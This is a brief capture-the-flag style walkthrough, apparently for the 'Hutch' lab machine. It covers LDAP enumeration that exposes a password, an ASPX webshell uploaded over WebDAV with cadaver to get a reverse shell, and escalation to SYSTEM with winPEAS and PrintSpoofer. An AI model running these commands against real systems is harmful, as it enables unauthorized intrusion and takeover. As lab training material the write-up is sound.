# Hutch
> DC enum + LDAP credentials + cadaver WebDAV

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
ldapsearch -x -H ldap://<IP> -b "DC=hutch,DC=offsec" -s sub "(objectClass=user)" | grep -i description
```

Password found in a user's LDAP description field.

## Exploitation

WebDAV enabled. Webshell upload using `cadaver`:

```
cadaver http://<IP>/
# use LDAP credentials
put shell.aspx
```

Browser access → reverse shell as service user.

## Privilege Escalation

```
.\winPEAS.exe
```

Service credentials or impersonation token available.

```
.\PrintSpoofer.exe -i -c cmd
```

SYSTEM obtained.
